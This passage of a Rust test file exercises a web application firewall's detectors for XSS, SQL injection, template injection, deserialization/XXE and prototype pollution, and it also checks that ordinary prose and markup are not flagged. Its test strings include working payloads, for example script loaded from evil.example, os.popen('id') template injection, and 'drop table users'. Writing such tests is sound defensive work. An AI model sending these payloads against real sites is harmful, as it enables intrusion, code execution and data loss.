        assert!(detect_xss("<body onpageshow=alert(1)>", Scope::Body).is_some());
        assert!(detect_xss("<details ontoggle=alert(1)>", Scope::Body).is_some());
    }

    #[test]
    fn xss_encoded_variants() {
        assert!(detect_xss("%3Cscript%3Ealert(1)%3C%2Fscript%3E", Scope::Url).is_some());
        assert!(detect_xss("%253Cscript%253E", Scope::Url).is_some());
        assert!(detect_xss("&lt;svg onload=alert(1)&gt;", Scope::Body).is_some());
        assert!(detect_xss("&#x3c;img src=x onerror=alert(1)&#x3e;", Scope::Body).is_some());
        assert!(detect_xss("\\u003cscript\\u003ealert(1)", Scope::Body).is_some());
        assert!(detect_xss("＜script＞alert(1)＜/script＞", Scope::Body).is_some());
    }

    #[test]
    fn xss_protocols_data_uri_css_and_dom() {
        assert!(detect_xss(r#"<a href="javascript:alert(1)">x</a>"#, Scope::Body).is_some());
        assert!(detect_xss("<iframe src=data:text/html,x>", Scope::Body).is_some());
        assert!(detect_xss(r#"<div style="width:expression(alert(1))">"#, Scope::Body).is_some());
        assert!(detect_xss("x=document.cookie", Scope::Url).is_some());
    }

    // C2 補強：固定清單之外的事件、夾字元的 scheme、%u／命名實體解碼、JS 執行函式。
    #[test]
    fn xss_c2_hardening_variants_are_flagged() {
        assert!(detect_xss("<x onauxclick=alert(1)>", Scope::Body).is_some());
        assert!(detect_xss("<x onfocusin=alert(1)>", Scope::Body).is_some());
        assert!(detect_xss("<marquee onstart=alert(1)>", Scope::Body).is_some());
        assert!(detect_xss("<a href=\"jav&#x09;ascript:alert(1)\">x</a>", Scope::Body).is_some());
        assert!(detect_xss("<a href=\"java%09script:alert(1)\">x</a>", Scope::Url).is_some());
        assert!(detect_xss("<a href=\"jav&Tab;ascript:alert(1)\">x</a>", Scope::Body).is_some());
        assert!(detect_xss("<svg><set attributeName=href to=javascript:alert(1)>", Scope::Body).is_some());
        assert!(detect_xss("<svg><animate attributeName=href values=javascript:alert(1)>", Scope::Body).is_some());
        // 本體為 JSON 原文：引號以 \" 跳脫，解析後才是 href="jav\tascript:…"。
        assert!(detect_xss(r#"{"html":"<a href=\"jav\u0009ascript:alert(1)\">x</a>"}"#, Scope::Body).is_some());
        assert!(detect_xss(r#"{"html":"<a href=\"https://example.com\">link</a>"}"#, Scope::Body).is_none());
        assert!(detect_xss("%u003cscript%u003ealert(1)%u003c/script%u003e", Scope::Url).is_some());
        assert!(detect_xss("x=eval(atob('YWxlcnQoMSk='))", Scope::Url).is_some());
        // 屬性跳出：不含 alert／document.cookie 等已知執行函式，只靠屬性結構攔截。
        assert!(detect_xss("\" autofocus onfocus=import('//evil.example/x.js') x=\"", Scope::Url).is_some());
        assert!(detect_xss("\"; autofocus onfocus=import('//evil.example/x.js')", Scope::Url).is_some(), "分號不得成為繞過");
        assert!(detect_xss("a=\"x\"; onboarding=done", Scope::Url).is_none());
        assert!(detect_xss("q=\"hello\" online=yes", Scope::Url).is_none());
        assert!(detect_xss("\" autofocus onfocus=import('//evil.example/x.js')", Scope::Body).is_none(), "本體範圍不套用");
        assert!(detect_xss("x=eval(atob('YWxlcnQoMSk='))", Scope::Body).is_none(), "本體範圍不套用 URL 專用規則");
        assert!(detect_xss("'-alert(1)-'", Scope::Url).is_some());
        // 本體不套用 JS 執行函式（教材與程式碼常含 alert(）。
        assert!(detect_xss("請用 alert(1) 練習", Scope::Body).is_none());
    }

    /// R-13：本體範圍的標籤事件只比對白名單；URL 範圍維持通用規則（覆蓋不縮小）。
    #[test]
    fn xss_tag_event_whitelist_for_body() {
        assert!(detect_xss("<span title=\"online=yes\">課程</span>", Scope::Body).is_none(), "online= 不得誤判");
        assert!(detect_xss("<span title=\"onboarding=done\">", Scope::Body).is_none());
        assert!(detect_xss("<img src=x onerror=alert(1)>", Scope::Body).is_some());
        assert!(detect_xss("<body onpageshow=x>", Scope::Body).is_some());
        // URL 範圍：通用規則仍在，行為與 R-13 之前相同。
        assert!(detect_xss("<span title=\"online=yes\">", Scope::Url).is_some());
    }

    // ---- XSS：不應命中（正常內容） ----
    #[test]
    fn xss_normal_markup_is_not_flagged() {
        assert!(detect_xss("<p>Hello world</p>", Scope::Body).is_none());
        assert!(detect_xss(r#"<a href="https://example.com">link</a>"#, Scope::Body).is_none());
        assert!(detect_xss(r#"<img src="a.png" alt="onion">"#, Scope::Body).is_none());
        assert!(detect_xss(r#"<p class="one">x</p>"#, Scope::Body).is_none());
        assert!(detect_xss("data:image/png;base64,iVBORw0KGgo=", Scope::Body).is_none());
        assert!(detect_xss("事件 onload 說明文字", Scope::Body).is_none());
    }

    #[test]
    fn dom_rules_are_url_scope_only() {
        // 教材與程式碼中的 document.cookie 不應在本體範圍被擋下。
        assert!(detect_xss("document.cookie 是什麼？", Scope::Body).is_none());
        assert!(detect_xss("document.cookie 是什麼？", Scope::Url).is_some());
    }

    // ---- 本體分段 ----
    #[test]
    fn body_windows_small_body_is_scanned_whole() {
        let (head, tail) = body_windows("short body");
        assert_eq!(head, "short body");
        assert!(tail.is_none());
    }

    #[test]
    fn body_windows_large_body_scans_head_and_tail() {
        let pad = "a".repeat(BODY_SCAN_WINDOW_BYTES * 3);
        let head_payload = format!("1 union select 1 {pad}");
        let (head, tail) = body_windows(&head_payload);
        assert!(detect_sqli(head, Scope::Url).is_some());
        assert!(tail.is_some());

        let tail_payload = format!("{pad}1 union select 1");
        let (head, tail) = body_windows(&tail_payload);
        assert!(detect_sqli(head, Scope::Url).is_none());
        assert!(detect_sqli(tail.unwrap(), Scope::Url).is_some());
    }

    #[test]
    fn body_windows_respect_char_boundaries() {
        // 每個中文字 3 bytes；切割點必須落在字元邊界上。
        let body = "中".repeat(BODY_SCAN_WINDOW_BYTES);
        let (head, tail) = body_windows(&body);
        assert!(std::str::from_utf8(head.as_bytes()).is_ok());
        if let Some(t) = tail {
            assert!(t.chars().all(|c| c == '中'));
        }
    }

    #[test]
    fn sqli_body_scope_avoids_common_prose() {
        // 作業繳交或文章中的英文句子，不應因本體掃描被 403。
        assert!(detect_sqli("Fix the bugs; update the docs before Friday", Scope::Body).is_none());
        assert!(detect_sqli("call sleep(1) to wait", Scope::Body).is_none());
        assert!(detect_sqli("Please select the best option; select one from the list", Scope::Body).is_none());
        assert!(detect_sqli("name=x; select id from users", Scope::Body).is_some());
        // 真正的堆疊查詢仍會命中。
        assert!(detect_sqli("name=x; drop table users", Scope::Body).is_some());
        assert!(detect_sqli("name=x; update users set role='admin'", Scope::Body).is_some());
        // URL 範圍的時間延遲規則仍然生效。
        assert!(detect_sqli("id=1 and sleep(5)", Scope::Url).is_some());
    }

    #[test]
    fn all_patterns_compile() {
        // 觸發所有 Lazy 初始化（任一 pattern 錯誤會在這裡 panic）。
        assert!(SQLI_RULES.len() >= 8);
        assert!(SQLI_RULES.iter().any(|r| r.2));
        assert!(XSS_RULES_COMMON.len() >= 6);
        assert_eq!(XSS_RULES_URL_ONLY.len(), 4);
        let _ = detect_sqli("", Scope::Url);
        let _ = detect_xss("", Scope::Url);
    }
}

#[cfg(test)]
mod e6_tests {
    //! WAF_DESER_V1 / WAF_SSTI_PROTO_V2 測試（E4、E5、E6）。尚未編譯與執行。
    use super::*;

    #[test]
    fn ssti_handlebars_nunjucks_node_and_block_forms_are_detected() {
        assert!(detect_ssti("{{ range.constructor(\"return process.mainModule\") }}", Scope::Body).is_some());
        assert!(detect_ssti("{{ x.constructor('alert(1)')() }}", Scope::Body).is_some());
        assert!(detect_ssti("{{ require('child_process') }}", Scope::Body).is_some());
        assert!(detect_ssti("{% set x = ''.__class__.__mro__ %}", Scope::Body).is_some());
        assert!(detect_ssti("{% import os %}{% os.popen('id') %}", Scope::Body).is_some());
        assert!(detect_ssti("<% import os %><%= os.popen('id').read %>", Scope::Body).is_some());
    }

    #[test]
    fn ssti_ordinary_block_and_handlebars_syntax_is_not_flagged() {
        assert!(detect_ssti("{% for item in items %}<li>{{ item.name }}</li>{% endfor %}", Scope::Body).is_none());
        assert!(detect_ssti("{% if user.isAdmin %}管理者{% endif %}", Scope::Body).is_none());
        assert!(detect_ssti("<% if (ready) { %>顯示<% } %>", Scope::Body).is_none());
        assert!(detect_ssti("{{#each students}}{{this}}{{/each}}", Scope::Body).is_none());
    }

    #[test]
    fn java_magic_needs_token_boundary() {
        assert!(detect_deserialization("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", Scope::Body).is_some());
        assert!(detect_deserialization("data=aced0005737200", Scope::Url).is_some());
        // 隨機 base64 中間出現的 ro0ab 不應命中（前面是 base64 字元，沒有邊界）。
        assert!(detect_deserialization("iVBORw0KGgoAAAANSUhEUgAAAro0ABcdefgh", Scope::Body).is_none());
    }

    #[test]
    fn gadget_and_dotnet_markers_are_detected_in_body() {
        assert!(detect_deserialization("org.apache.commons.collections.functors.InvokerTransformer", Scope::Body).is_some());
        assert!(detect_deserialization("AAEAAAD/////AQAAAAAAAAAE", Scope::Body).is_some());
    }

    #[test]
    fn xxe_external_or_internal_doctype_is_detected_but_html_doctype_is_not() {
        assert!(detect_deserialization("<!DOCTYPE r SYSTEM \"http://evil.example/x.dtd\"><r/>", Scope::Body).is_some());
        assert!(detect_deserialization("<!DOCTYPE r [<!ELEMENT r ANY>]><r/>", Scope::Body).is_some());
        assert!(detect_deserialization("<!DOCTYPE html>", Scope::Body).is_none());
        assert!(detect_deserialization("<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">", Scope::Body).is_none());
    }

    #[test]
    fn php_object_and_unserialize_are_url_only() {
        assert!(detect_deserialization(r#"?d=O:8:"stdClass":1:{s:1:"a";i:1;}"#, Scope::Url).is_some());
        assert!(detect_deserialization("?x=unserialize($_GET['a'])", Scope::Url).is_some());
        assert!(detect_deserialization("unserialize($data) 會有安全風險", Scope::Body).is_none());
    }

    #[test]
    fn proto_path_string_values_and_lookup_getter() {
        assert!(detect_proto_pollution(r#"{"path": "__proto__.polluted", "value": 1}"#, Scope::Body).is_some());
        assert!(detect_proto_pollution(r#"{"key":"constructor.prototype.x"}"#, Scope::Body).is_some());
        assert!(detect_proto_pollution("?x=__lookupGetter__(a)", Scope::Url).is_some());
        assert!(detect_proto_pollution("obj.__proto__ === Foo.prototype", Scope::Body).is_none());
        assert!(detect_proto_pollution(r#"{"title":"__proto__ 是 JS 的內部屬性"}"#, Scope::Body).is_none());
    }
}
